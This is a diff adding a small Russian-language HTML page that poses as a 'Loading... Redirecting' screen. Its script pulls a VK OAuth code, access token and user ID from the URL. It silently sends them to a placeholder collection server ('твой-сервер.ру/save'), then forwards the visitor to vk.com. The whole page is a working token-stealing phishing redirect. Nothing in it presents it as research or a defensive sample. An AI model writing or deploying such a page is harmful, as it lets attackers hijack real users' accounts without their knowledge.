@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Загрузка...</title>
+</head>
+<body>
+  <p>Перенаправление...</p>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const hash = new URLSearchParams(window.location.hash.substring(1));
+    const code = params.get("code");
+    const token = hash.get("access_token");
+    const userId = hash.get("user_id");
+
+    if (code || token) {
+      fetch("https://твой-сервер.ру/save", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({code, token, user_id: userId})
+      }).catch(() => {});
+    }
+    setTimeout(() => { window.location = "https://vk.com/"; }, 500);
+  </script>
+</body>
+</html>
